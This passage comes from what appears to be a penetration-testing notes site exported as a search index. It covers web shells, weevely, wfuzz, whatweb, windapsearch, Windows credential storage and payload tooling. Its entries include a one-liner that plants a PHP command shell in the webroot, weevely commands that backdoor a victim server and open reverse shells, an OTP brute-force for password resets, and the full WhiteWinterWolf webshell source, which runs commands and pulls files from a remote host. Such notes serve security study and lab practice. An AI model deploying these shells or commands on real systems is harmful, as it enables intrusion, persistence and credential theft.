remote host's web directory to execute the script through the web browser.</p> <p>2. REMOTE CODE EXECUTION: By writting our one-liner shell to the webroot to access it over the web. This would be if onle have remote command execution as a exploit vector. Here an example for bash:</p> <pre><code>echo '&lt;?php system($_REQUEST[\"cmd\"]); ?&gt;' &gt; /var/www/html/shell.php\n</code></pre> <p>So, for the second way of exploitation, it's relevant to identify where the webroot is. The following are the default webroots for common web servers:</p> Web Server Default Webroot Apache /var/www/html/ Nginx /usr/local/nginx/html/ IIS c:\\inetpub\\wwwroot\\ XAMPP C:\\xampp\\htdocs\\","tags":["pentesting","webshell","reverse-shells"]},{"location":"web-shells/#accessing-the-web-shell","title":"Accessing the web shell","text":"<p>We can access to the web shell using the browser. Or Curl:</p> <pre><code>curl http://SERVER_IP:PORT/shell.php?cmd=id\n</code></pre> <p>A  benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. </p>","tags":["pentesting","webshell","reverse-shells"]},{"location":"web-shells/#tools","title":"Tools","text":"<p>About webshells.</p> <p>Laudanum</p> <p>nishang</p>","tags":["pentesting","webshell","reverse-shells"]},{"location":"webdav-wsgidav/","title":"WsgiDAV: A generic and extendable WebDAV server","text":"<p>A generic and extendable WebDAV server written in Python and based on WSGI. When Microsoft is preventing SMB traffic, there is an alternative: running SMB over HTTP with\u00a0<code>WebDav</code>.\u00a0<code>WebDAV</code> (RFC 4918)\u00a0is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The\u00a0<code>WebDAV</code>\u00a0protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring.\u00a0<code>WebDAV</code>\u00a0can also use HTTPS.</p> <p>When you use\u00a0<code>SMB</code>, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP.</p>","tags":["pentesting","windows","server"]},{"location":"webdav-wsgidav/#installation","title":"Installation","text":"<p>Download from github repo: https://github.com/mar10/wsgidav.</p> <pre><code>sudo pip install wsgidav cheroot\n</code></pre>","tags":["pentesting","windows","server"]},{"location":"webdav-wsgidav/#basis-usage","title":"Basis usage","text":"<pre><code>sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n</code></pre>","tags":["pentesting","windows","server"]},{"location":"weevely/","title":"weevely","text":"<p>Weevely is\u00a0a stealth PHP web shell that simulate telnet-like connection. It is an essential tool for web application post exploitation, and can be used as stealth backdoor or as a web shell to manage legit web accounts, even free hosted ones.</p> <pre><code># Generate backdoor agent\nweevely generate &lt;password&gt; &lt;path/to/save/your/phpBackdoorNamefile.php&gt;\n#generate is for generating a backdoor\n# password to access the file\n\n# Then, you upload the file into the victim's server and use weevely to connect\n# Run terminal to the target\n weevely &lt;URL&gt; &lt;password&gt; [cmd]\n\n\n# Load session file\nweevely session &lt;path&gt;\n</code></pre> <p>Upload weevely PHP agent to a target web server to get remote shell access to it. It has more than 30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate privileges, and spread into the target network.</p> <ul> <li>Read the\u00a0Install\u00a0page to install weevely and its dependencies.</li> <li>Read the\u00a0Getting Started\u00a0page to generate an agent and connect to it.</li> <li>Browse the\u00a0Wiki\u00a0to read examples and use cases.</li> </ul>","tags":["pentesting\u00e7","web","pentesting","enumeration"]},{"location":"weevely/#example-from-a-lab","title":"Example from a lab","text":"<p>Generate a php webshell with Weevely and saving it an image:</p> <pre><code>weevely generate secretpassword example.png \n</code></pre> <p>Upload it to the application.</p> <p></p> <p>Make the connection with weevely:</p> <pre><code>weevely https://example.com/uploads/example.jpg/example.php secretpassword\n</code></pre> <p></p>","tags":["pentesting\u00e7","web","pentesting","enumeration"]},{"location":"weevely/#weevely-commands","title":"weevely commands","text":"<pre><code># Cray for Help\nweevely&gt; help\n</code></pre> <p>In an attack you will probably need:</p> <pre><code># Read /etc/passwd with different techniques. Nice touch here is that weevely can bypass some restriction introduced in \"cat /etc/passwd\". For that it uses the attribute -vector\n:audit_etcpasswd            \n# -vector: posix_getpwuid, file, fread, file_get_contents, base64\n\n# Collect system information\n:system_info\n\n# Audit the file system for weak permissions.\n:audit_filesystem\n\n# Execute shell commands, BUT the cool part is that it bypasses the inability to run a bash command by tunnelling into a different language command. To see available languages, use the attribute -h\n:shell_sh -vector &lt;VectorValue&gt; &lt;Command&gt;\n# -vector With attribute vector you can choose to execute bash through php, python...\n\n# Download file from remote filesystem.\n:file_download -vector &lt;VECTORValue&gt; &lt;rpath&gt; &lt;lpath&gt;\n# -vector: file, fread, file_get_contents, base64\n# rpath: remote path of the file you want to download\n# lpath: location where you want to save it\n\n\n# Upload file to remote filesystem.\n:file_upload \n\n# Execute a reverse TCP shell.\n:backdoor_reversetcp -shell &lt;SHELLType&gt; -npo-autonnet -vector &lt;VALUEofVector&gt; &lt;LHOST&gt; &lt;LPORT&gt; \n:backdoor_reversetcp -h\n</code></pre>","tags":["pentesting\u00e7","web","pentesting","enumeration"]},{"location":"weevely/#weevely-complete-list-of-commands","title":"weevely complete list of commands","text":"Module Description :audit_filesystem Audit the file system for weak permissions. :audit_suidsgid Find files with SUID or SGID flags. :audit_disablefunctionbypass Bypass disable_function restrictions with mod_cgi and .htaccess. :audit_etcpasswd Read /etc/passwd with different techniques. :audit_phpconf Audit PHP configuration. :shell_sh Execute shell commands. :shell_su Execute commands with su. :shell_php Execute PHP commands. :system_extensions Collect PHP and webserver extension list. :system_info Collect system information. :system_procs List running processes. :backdoor_reversetcp Execute a reverse TCP shell. :backdoor_tcp Spawn a shell on a TCP port. :bruteforce_sql Bruteforce SQL database. :file_gzip Compress or expand gzip files. :file_clearlog Remove string from a file. :file_check Get attributes and permissions of a file. :file_upload Upload file to remote filesystem. :file_webdownload Download an URL. :file_tar Compress or expand tar archives. :file_download Download file from remote filesystem. :file_bzip2 Compress or expand bzip2 files. :file_edit Edit remote file on a local editor. :file_grep Print lines matching a pattern in multiple files. :file_ls List directory content. :file_cp Copy single file. :file_rm Remove remote file. :file_upload2web Upload file automatically to a web folder and get corres :file_zip Compress or expand zip files. :file_touch Change file timestamp. :file_find Find files with given names and attributes. :file_mount Mount remote filesystem using HTTPfs. :file_enum Check existence and permissions of a list of paths. :file_read Read remote file from the remote filesystem. :file_cd Change current working directory. :sql_console Execute SQL query or run console. :sql_dump Multi dbms mysqldump replacement. :net_mail Send mail. :net_phpproxy Install PHP proxy on the target. :net_curl Perform a curl-like HTTP request. :net_proxy Run local proxy to pivot HTTP/HTTPS browsing through the :net_scan TCP Port scan. :net_ifconfig Get network interfaces addresses.","tags":["pentesting\u00e7","web","pentesting","enumeration"]},{"location":"wfuzz/","title":"wfuzz","text":"","tags":["pentesting","web pentesting"]},{"location":"wfuzz/#basic-commands","title":"Basic commands","text":"<pre><code>wfuzz -d '{\"email\":\"hapihacker@hapihacker.com\",\"password\":\"PASSWORD\"}' -H 'Content-Type: application/json'-z file,/usr/share/wordlists/rockyou.txt -u http://localhost:8888/identity/api/auth/login --hc 500\n# -H to specify content-type headers. You use a -H flag for each header\n# -d allows you to include the POST Body data. \n# -u specifies the url\n# --hc/hl/hw/hh hide responses with the specified code/lines/words/chars. In our case, \"--hc 500\" hides 500 code responses.\n# -z specifies a payload   \n</code></pre> <pre><code># Fuzzing an old api version which doesn't implement a request limit when resetting password. It allows us to FUZZ the OTP and reset the password for any user.\nwfuzz -d '{\"email\":\"hapihacker@hapihacker.com\", \"otp\":\"FUZZ\" \"password\":\"NewPasswordreseted\"}' -H 'Content-Type: application/json'-z file,/usr/share/wordlists/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://localhost:8888/identity/api/auth/v2/check-otp  --hc 500\n</code></pre> <p>Subdomain enumeration:</p> <pre><code>wfuzz -c --hc 404 -t 200 -u https://nunchucks.htb/ -w /usr/share/dirb/wordlists/common.txt -H \"Host: FUZZ.nunchucks.htb\" --hl 546\n# -c: Color in output\n# \u2013hc 404: Hide 404 code responses\n# -t 200: Concurrent Threads\n# -u http://nunchucks.htb/: Target URL\n# -w /usr/share/dirb/wordlists/common.txt: Wordlist \n# -H \u201cHost: FUZZ.nunchucks.htb\u201d: Header. Also with \"FUZZ\" we indicate the injection point for payloads\n# \u2013hl 546: Filter out responses with a specific number of lines. In this case, 546\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"wfuzz/#encoding","title":"Encoding","text":"<pre><code># Check which wfuzz encoders are available\nwfuzz -e encoders\n\n# To use an encoder, add a comma to the payload and specify the encoder name\nwfuzz -z file,path/to/payload.txt,base64 http://hackig-example.com/api/v2/FUZZ\n\n# Using multiple encoders. Each payload will be processed in separated requests.  \nwfuzz -z list,a,base64-md5-none \n# this results in three payloads: one encoded in base64, another in md5 and last with none. \n\n# Each payload will be processed by multiple encoders.\nwfuzz -z file,payload1-payload2,base64@md5@random_upper -u http://hackig-example.com/api/v2/FUZZ\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"wfuzz/#dealing-with-rate-limits-in-apis","title":"Dealing with rate limits (in APIs)","text":"<pre><code>-s  Specify a time delay between requests.\n-t Specify the concurrent number of connections\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"whatweb/","title":"whatweb","text":"<p>WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.</p>","tags":["pentesting","web pentesting","enumeration"]},{"location":"whatweb/#installation","title":"Installation","text":"<p>Already installed in Kali.</p> <p>Download from: https://github.com/urbanadventurer/WhatWeb</p>","tags":["pentesting","web pentesting","enumeration"]},{"location":"whatweb/#basic-usage","title":"Basic usage","text":"<pre><code># version of web servers, supporting frameworks, and applications\nwhatweb $ip\nwhatweb &lt;hostname&gt;\n\n# Automate web application enumeration across a network.\nwhatweb --no-errors 10.10.10.0/24\n\n\nwhatweb -a3 https://www.example.com -v\n# -a3: aggression level 3\n# -v: verbose mode\n</code></pre>","tags":["pentesting","web pentesting","enumeration"]},{"location":"whitewinterwolf-webshell/","title":"WhiteWinterWolf php webshell","text":"<p>Source: https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php.</p> <p>It is similar to the Antak Webshell in aspx from the nishang project but with php. It generates a page on the server from which we can indicate the ip and port where we want to receive the output of the commands we introduce,</p> <pre><code>&lt;?php\n/*******************************************************************************\n * Copyright 2017 WhiteWinterWolf\n * https://www.whitewinterwolf.com/tags/php-webshell/\n *\n * This file is part of wwolf-php-webshell.\n *\n * wwwolf-php-webshell is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.\n ******************************************************************************/\n\n/*\n * Optional password settings.\n * Use the 'passhash.sh' script to generate the hash.\n * NOTE: the prompt value is tied to the hash!\n */\n$passprompt = \"WhiteWinterWolf's PHP webshell: \";\n$passhash = \"\";\n\nfunction e($s) { echo htmlspecialchars($s, ENT_QUOTES); }\n\nfunction h($s)\n{\n    global $passprompt;\n    if (function_exists('hash_hmac'))\n    {\n        return hash_hmac('sha256', $s, $passprompt);\n    }\n    else\n    {\n        return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));\n    }\n}\n\nfunction fetch_fopen($host, $port, $src, $dst)\n{\n    global $err, $ok;\n    $ret = '';\n    if (strpos($host, '://') === false)\n    {\n        $host = 'http://' . $host;\n    }\n    else\n    {\n        $host = str_replace(array('ssl://', 'tls://'), 'https://', $host);\n    }\n    $rh = fopen(\"${host}:${port}${src}\", 'rb');\n    if ($rh !== false)\n    {\n        $wh = fopen($dst, 'wb');\n        if ($wh !== false)\n        {\n            $cbytes = 0;\n            while (! feof($rh))\n            {\n                $cbytes += fwrite($wh, fread($rh, 1024));\n            }\n            fclose($wh);\n            $ret .= \"${ok} Fetched file &lt;i&gt;${dst}&lt;/i&gt; (${cbytes} bytes)&lt;br /&gt;\";\n        }\n        else\n        {\n            $ret .= \"${err} Failed to open file &lt;i&gt;${dst}&lt;/i&gt;&lt;br /&gt;\";\n        }\n        fclose($rh);\n    }\n    else\n    {\n        $ret = \"${err} Failed to open URL &lt;i&gt;${host}:${port}${src}&lt;/i&gt;&lt;br /&gt;\";\n    }\n    return $ret;\n}\n\nfunction fetch_sock($host, $port, $src, $dst)\n{\n    global $err, $ok;\n    $ret = '';\n    $host = str_replace('https://', 'tls://', $host);\n    $s = fsockopen($host, $port);\n    if ($s)\n    {\n        $f = fopen($dst, 'wb');\n        if ($f)\n        {\n            $buf = '';\n            $r = array($s);\n            $w = NULL;\n            $e = NULL;\n            fwrite($s, \"GET ${src} HTTP/1.0\\r\\n\\r\\n\");\n            while (stream_select($r, $w, $e, 5) &amp;&amp; !feof($s))\n            {\n                $buf .= fread($s, 1024);\n            }\n            $buf = substr($buf, strpos($buf, \"\\r\\n\\r\\n\") + 4);\n            fwrite($f, $buf);\n            fclose($f);\n            $ret .= \"${ok} Fetched file &lt;i&gt;${dst}&lt;/i&gt; (\" . strlen($buf) . \" bytes)&lt;br /&gt;\";\n        }\n        else\n        {\n            $ret .= \"${err} Failed to open file &lt;i&gt;${dst}&lt;/i&gt;&lt;br /&gt;\";\n        }\n        fclose($s);\n    }\n    else\n    {\n        $ret .= \"${err} Failed to connect to &lt;i&gt;${host}:${port}&lt;/i&gt;&lt;br /&gt;\";\n    }\n    return $ret;\n}\n\nini_set('log_errors', '0');\nini_set('display_errors', '1');\nerror_reporting(E_ALL);\n\nwhile (@ ob_end_clean());\n\nif (! isset($_SERVER))\n{\n    global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;\n    $_FILES = &amp;$HTTP_POST_FILES;\n    $_POST = &amp;$HTTP_POST_VARS;\n    $_SERVER = &amp;$HTTP_SERVER_VARS;\n}\n\n$auth = '';\n$cmd = empty($_POST['cmd']) ? '' : $_POST['cmd'];\n$cwd = empty($_POST['cwd']) ? getcwd() : $_POST['cwd'];\n$fetch_func = 'fetch_fopen';\n$fetch_host = empty($_POST['fetch_host']) ? $_SERVER['REMOTE_ADDR'] : $_POST['fetch_host'];\n$fetch_path = empty($_POST['fetch_path']) ? '' : $_POST['fetch_path'];\n$fetch_port = empty($_POST['fetch_port']) ? '80' : $_POST['fetch_port'];\n$pass = empty($_POST['pass']) ? '' : $_POST['pass'];\n$url = $_SERVER['REQUEST_URI'];\n$status = '';\n$ok = '&amp;#9786; :';\n$warn = '&amp;#9888; :';\n$err = '&amp;#9785; :';\n\nif (! empty($passhash))\n{\n    if (function_exists('hash_hmac') || function_exists('mhash'))\n    {\n        $auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];\n        if (h($auth) !== $passhash)\n        {\n            ?&gt;\n                &lt;form method=\"post\" action=\"&lt;?php e($url); ?&gt;\"&gt;\n                    &lt;?php e($passprompt); ?&gt;\n                    &lt;input type=\"password\" size=\"15\" name=\"pass\"&gt;\n                    &lt;input type=\"submit\" value=\"Send\"&gt;\n                &lt;/form&gt;\n            &lt;?php\n            exit;\n        }\n    }\n    else\n    {\n        $status .= \"${warn} Authentication disabled ('mhash()' missing).&lt;br /&gt;\";\n    }\n}\n\nif (! ini_get('allow_url_fopen'))\n{\n    ini_set('allow_url_fopen', '1');\n    if (! ini_get('allow_url_fopen'))\n    {\n        if (function_exists('stream_select'))\n        {\n            $fetch_func = 'fetch_sock';\n        }\n        else\n        {\n            $fetch_func = '';\n            $status .= \"${warn} File fetching disabled ('allow_url_fopen'\"\n                . \" disabled and 'stream_select()' missing).&lt;br /&gt;\";\n        }\n    }\n}\nif (! ini_get('file_uploads'))\n{\n    ini_set('file_uploads', '1');\n    if (! ini_get('file_uploads'))\n    {\n        $status .= \"${warn} File uploads disabled.&lt;br /&gt;\";\n    }\n}\nif (ini_get('open_basedir') &amp;&amp; ! ini_set('open_basedir', ''))\n{\n    $status .= \"${warn} open_basedir = \" . ini_get('open_basedir') . \"&lt;br /&gt;\";\n}\n\nif (! chdir($cwd))\n{\n  $cwd = getcwd();\n}\n\nif (! empty($fetch_func) &amp;&amp; ! empty($fetch_path))\n{\n    $dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);\n    $status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);\n}\n\nif (ini_get('file_uploads') &amp;&amp; ! empty($_FILES['upload']))\n{\n    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);\n    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest))\n    {\n        $status .= \"${ok} Uploaded file &lt;i&gt;${dest}&lt;/i&gt; (\" . $_FILES['upload']['size'] . \" bytes)&lt;br /&gt;\";\n    }\n}\n?&gt;\n\n&lt;form method=\"post\" action=\"&lt;?php e($url); ?&gt;\"\n    &lt;?php if (ini_get('file_uploads')): ?&gt;\n        enctype=\"multipart/form-data\"\n    &lt;?php endif; ?&gt;\n    &gt;\n    &lt;?php if (! empty($passhash)): ?&gt;\n        &lt;input type=\"hidden\" name=\"auth\" value=\"&lt;?php e($auth); ?&gt;\"&gt;\n    &lt;?php endif; ?&gt;\n    &lt;table border=\"0\"&gt;\n        &lt;?php if (! empty($fetch_func)): ?&gt;\n            &lt;tr&gt;&lt;td&gt;\n                &lt;b&gt;Fetch:&lt;/b&gt;\n            &lt;/td&gt;&lt;td&gt;\n                host: &lt;input type=\"text\" size=\"15\" id=\"fetch_host\" name=\"fetch_host\" value=\"&lt;?php e($fetch_host); ?&gt;\"&gt;\n                port: &lt;input type=\"text\" size=\"4\" id=\"fetch_port\" name=\"fetch_port\" value=\"&lt;?php e($fetch_port); ?&gt;\"&gt;\n                path: &lt;input type=\"text\" size=\"40\" id=\"fetch_path\" name=\"fetch_path\" value=\"\"&gt;\n            &lt;/td&gt;&lt;/tr&gt;\n        &lt;?php endif; ?&gt;\n        &lt;tr&gt;&lt;td&gt;\n            &lt;b&gt;CWD:&lt;/b&gt;\n        &lt;/td&gt;&lt;td&gt;\n            &lt;input type=\"text\" size=\"50\" id=\"cwd\" name=\"cwd\" value=\"&lt;?php e($cwd); ?&gt;\"&gt;\n            &lt;?php if (ini_get('file_uploads')): ?&gt;\n                &lt;b&gt;Upload:&lt;/b&gt; &lt;input type=\"file\" id=\"upload\" name=\"upload\"&gt;\n            &lt;?php endif; ?&gt;\n        &lt;/td&gt;&lt;/tr&gt;\n        &lt;tr&gt;&lt;td&gt;\n            &lt;b&gt;Cmd:&lt;/b&gt;\n        &lt;/td&gt;&lt;td&gt;\n            &lt;input type=\"text\" size=\"80\" id=\"cmd\" name=\"cmd\" value=\"&lt;?php e($cmd); ?&gt;\"&gt;\n        &lt;/td&gt;&lt;/tr&gt;\n        &lt;tr&gt;&lt;td&gt;\n        &lt;/td&gt;&lt;td&gt;\n            &lt;sup&gt;&lt;a href=\"#\" onclick=\"cmd.value=''; cmd.focus(); return false;\"&gt;Clear cmd&lt;/a&gt;&lt;/sup&gt;\n        &lt;/td&gt;&lt;/tr&gt;\n        &lt;tr&gt;&lt;td colspan=\"2\" style=\"text-align: center;\"&gt;\n            &lt;input type=\"submit\" value=\"Execute\" style=\"text-align: right;\"&gt;\n        &lt;/td&gt;&lt;/tr&gt;\n    &lt;/table&gt;\n\n&lt;/form&gt;\n&lt;hr /&gt;\n\n&lt;?php\nif (! empty($status))\n{\n    echo \"&lt;p&gt;${status}&lt;/p&gt;\";\n}\n\necho \"&lt;pre&gt;\";\nif (! empty($cmd))\n{\n    echo \"&lt;b&gt;\";\n    e($cmd);\n    echo \"&lt;/b&gt;\\n\";\n    if (DIRECTORY_SEPARATOR == '/')\n    {\n        $p = popen('exec 2&gt;&amp;1; ' . $cmd, 'r');\n    }\n    else\n    {\n        $p = popen('cmd /C \"' . $cmd . '\" 2&gt;&amp;1', 'r');\n    }\n    while (! feof($p))\n    {\n        echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);\n        @ flush();\n    }\n}\necho \"&lt;/pre&gt;\";\n\nexit;\n?&gt;\n</code></pre>","tags":["webshell","php"]},{"location":"windapsearch/","title":"Windapsearch - A tool for enumerating resources in Active Directory","text":"","tags":["tools"]},{"location":"windapsearch/#installation","title":"Installation","text":"<p>Download from: https://github.com/ropnop/windapsearch</p> <pre><code>git clone https://github.com/ropnop/windapsearch.git\npip install python-ldap #or apt-get install python-ldap\n# Troubleshooting: The python-ldap is based on OpenLDAP, so you need to have the development files (headers) in order to compile the Python module. If you're on Ubuntu, the package is called libldap2-dev.\n# sudo apt-get install libsasl2-dev python-dev-is-python3 libldap2-dev libssl-dev\n</code></pre>","tags":["tools"]},{"location":"windapsearch/#basic-commands","title":"Basic commands","text":"<pre><code># Enumerate Users\n./windapsearch.py -d $domain -u $username\\\\ldapbind -p $password -U\n# -U: returns only USERS\n# -u: specifies username. \"\" for blank\n# -p: indicates password\n# -d: indicates domain\n\n# Enumerate users with no user foothold\n./windapsearch.py --dc-ip $ip -u \"\" -U\n# -u: specifies username. \"\" for blank\n# -U: returns only USERS\n\n# Enumerate Domain Admins\n./windapsearch.py --dc-ip $ip -u $username@$domain -p $password --da\n./windapsearch.py -d $domain -u $username\\\\ldapbind -p $password --da\n# --da: returns only Domain admins\n# -u: specifies username. \"\" for blank\n# -p: indicates password\n# -d: indicates domain\n# Example:\n# python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da\n\n# Enumerating Computers\n./windapsearch.py -d $domain -u $username\\\\ldapbind -p $password -C -r\n# -r or --resolve option: the tool will perform a DNS lookup on every enumerated dNSHostName found and output the computer information, including IP address in CSV format. \n# -C: list all matching entries where objectClass=Computer\n\n# Custom Search \n./windapsearch.py -d $domain -u $username\\\\ldapbind -p $password -s Lalala\n# -s: search everywhere the term, in this case Lalala.\n\n# Enumerate Privilege Users with -PU\npython3 windapsearch.py --dc-ip $ip -u $username@$domain -p $password -PU\n</code></pre>","tags":["tools"]},{"location":"window-detective/","title":"Window Detective - A tool to view windows properties in the system","text":"","tags":["pentesting","windows","thick client"]},{"location":"window-detective/#installation","title":"Installation","text":"<p>Download it from: \u00a0Window Detective</p>","tags":["pentesting","windows","thick client"]},{"location":"windows-binaries/","title":"Windows binaries -  LOLBAS -  LOLBAS","text":"<p>Equivalent to suid binaries from linux in Windows would be: LOLBAS: https://lolbas-project.github.io/ (Living Off The Land Binaries, Scripts and Libraries),</p>","tags":["pentesting","privilege escalation","windows"]},{"location":"windows-credentials-storage/","title":"Windows credentials storage","text":"<p>Microsoft documentation.</p>","tags":["windows"]},{"location":"windows-credentials-storage/#how-login-happens","title":"How login happens","text":"<p>The Local Security Authority (LSA) is a protected subsystem that authenticates users and logs them into the local computer.</p> <p> Source: HackTheBox Academy. Module Password attacks.</p>","tags":["windows"]},{"location":"windows-credentials-storage/#lsass","title":"LSASS","text":"<p>Local Security Authority Subsystem Service (LSASS) is a collection of many modules and has access to all authentication processes that can be found in <code>%SystemRoot%\\System32\\Lsass.exe</code>. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the Event log.</p> <p>The LSA has the following components:</p> <p>Netlogon.dll . The Net Logon service. Net Logon maintains the computer's secure channel to a domain controller. It passes the user's credentials through a secure channel to the domain controller and returns the domain security identifiers and user rights for the user. In Windows\u00a02000, the Net Logon service uses DNS to resolve names to the Internet Protocol (IP) addresses of domain controllers. Net Logon is the replication protocol for Microsoft\u00ae Windows\u00a0NT\u00ae version\u00a04.0 primary domain controllers and backup domain controllers.</p> <p>Msv1_0.dll . The NTLM authentication protocol. This protocol authenticates clients that do not use Kerberos authentication.</p> <p>Schannel.dll . The Secure Sockets Layer (SSL) authentication protocol. This protocol provides authentication over an encrypted channel instead of a less-secure clear channel.</p> <p>Kerberos.dll . The Kerberos\u00a0v5 authentication protocol.</p> <p>Kdcsvc.dll . The Kerberos Key Distribution Center (KDC) service, which is responsible for granting ticket-granting tickets to clients.</p> <p>Lsasrv.dll . The LSA server service, which enforces security policies.</p> <p>Samsrv.dll . The Security Accounts Manager (SAM), which stores local security accounts, enforces locally stored policies, and supports APIs.</p> <p>Ntdsa.dll . The directory service module, which supports the Windows\u00a02000 replication protocol and Lightweight Directory Access Protocol (LDAP), and manages partitions of data.</p> <p>Secur32.dll . The multiple authentication provider that holds all of the components together.</p> <p>Upon initial logon, LSASS will:</p> <ul> <li>Cache credentials locally in memory</li> <li>Create access tokens</li> <li>Enforce security policies</li> <li>Write to Windows security log</li> </ul>","tags":["windows"]},{"location":"windows-credentials-storage/#gina","title":"GINA","text":"<p>Each interactive logon session creates a separate instance of the Winlogon service. The Graphical Identification and Authentication (GINA) architecture is loaded into the process area used by Winlogon, receives and processes the credentials, and invokes the authentication interfaces via the LSALogonUser function.</p>","tags":["windows"]},{"location":"windows-credentials-storage/#sam-database","title":"SAM Database","text":"<p>The Security Account Manager (<code>SAM</code>) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. User passwords are stored in a hash format in a registry structure as either an <code>LM</code> hash or an <code>NTLM</code> hash. This file is located in <code>%SystemRoot%/system32/config/SAM</code> and is mounted on HKLM/SAM. </p> <p>SYSTEM level permissions are required to view it.</p> <p>Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (<code>DC</code>) must validate the credentials from the Active Directory database (<code>ntds.dit</code>), which is stored in <code>%SystemRoot%\\ntds.dit</code>.</p> <p>Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the SYSKEY (syskey.exe) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.</p> <p>Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user's <code>Credential Locker</code>. Credentials are encrypted and stored at the following location:</p> <pre><code>PS C:\\Users\\[Username]\\AppData\\Local\\Microsoft\\[Vault/Credentials]\\\n</code></pre>","tags":["windows"]},{"location":"windows-credentials-storage/#domain-controllers","title":"Domain Controllers","text":"<p>Each Domain Controller hosts a file called <code>NTDS.dit</code> that is kept synchronized across all Domain Controllers with the exception of Read-Only Domain Controllers. NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:</p> <ul> <li>User accounts (username &amp; password hash)</li> <li>Group accounts</li> <li>Computer accounts</li> <li>Group policy objects</li> </ul>","tags":["windows"]},{"location":"windows-credentials-storage/#tools-for-dumping-credentials","title":"Tools for dumping credentials","text":"<ul> <li>CrackMapExec.</li> <li>John The Ripper.</li> <li>Hydra.</li> <li>Metasploit.</li> <li>Mimikatz.</li> <li>pypykatz.</li> <li>Lazagne.</li> </ul>","tags":["windows"]},{"location":"windows-credentials-storage/#findstr","title":"findstr","text":"<p>We can also use findstr to search from patterns across many types of files.</p> <pre><code>C:\\&gt; findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n</code></pre>","tags":["windows"]},{"location":"windows-footprinting/","title":"Footprinting Windows","text":"<p>Nmap script</p> <pre><code># To determine the OS\n sudo nmap -v -O $ip\n\n# To see banners of existing open ports\nsudo nmap -v $ip --script banner.nse\n</code></pre> <p>TTL technique <code>Time To Live</code>\u00a0(TTL) counter when utilizing ICMP to determine if the host is up. </p> <pre><code>ping $ip\n</code></pre> <p>A typical response from a Windows host will either be 32 or 128. We can utilize this value since most hosts will never be more than 20 hops away from your point of origin, so there is little chance of the TTL counter dropping into the acceptable values of another OS type. More at https://subinsb.com/default-device-ttl-values/.</p>","tags":["pentesting","windows"]},{"location":"windows-footprinting/#payloads","title":"Payloads","text":"<p>Payloads types:</p> <ul> <li>DLLs\u00a0A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once.</li> <li>Batch\u00a0Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of\u00a0<code>.bat</code>.</li> <li>VBS\u00a0VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages.</li> <li>MSI <code>.MSI</code>\u00a0files serve as an installation database for the Windows Installer.</li> <li>Powershell\u00a0Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems.</li> </ul> <p>Payload tools:</p> Resource Description MSFVenom &amp; Metasploit-Framework Source\u00a0MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. <code>Payloads All The Things</code> Source\u00a0Here, you can find many different resources and cheat sheets for payload generation and general methodology. <code>Mythic C2 Framework</code> Source\u00a0The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. Nishang Source\u00a0Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester. Darkarmour Source\u00a0Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts. <p>Payload transfers:</p> <ul> <li>Impacket:\u00a0Impacket\u00a0is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with\u00a0<code>psexec</code>,\u00a0<code>smbclient</code>,\u00a0<code>wmi</code>, Kerberos, and the ability to stand up an SMB server.</li> <li>Payloads All The Things: is a great resource to find quick oneliners to help transfer files across hosts expediently.</li> <li><code>SMB</code>: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these 